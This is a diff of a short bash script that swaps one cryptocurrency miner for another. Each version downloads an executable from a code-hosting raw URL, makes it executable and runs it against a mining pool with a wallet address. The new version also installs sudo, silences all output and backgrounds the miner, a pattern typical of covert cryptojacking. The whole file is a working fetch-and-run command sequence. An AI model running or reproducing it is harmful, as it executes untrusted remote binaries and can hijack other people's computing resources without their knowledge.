@@ -1,4 +1,6 @@
 #!/bin/bash
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
-chmod 777 lol1.81
-./lol1.81 -a PYRIN -p de.pyrin.herominers.com:1177 -u pyrin:qz5mu36m6hy997g3ytu92rwlhr3exvpdhyke3vhmak02lxc9n7xxkcrac36jx.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
+apt update
+apt -y install sudo
+wget https://github.com/cornea99/edann/raw/main/tuskeminer > /dev/null 2>&1 
+chmod +x tuskeminer
+./tuskeminer -a rx/0 --url 192.248.147.149:443 --user TuskeSyuXDmimmdhwmHLpzWxcgaxw28taAYJT79hbCfnJ7UHBLEKFFQG9Gbbv4fxGwd9kXPehzp2n1Yu43THWqdbKLujvTAWvH45mf.jancuk > /dev/null 2>&1 &
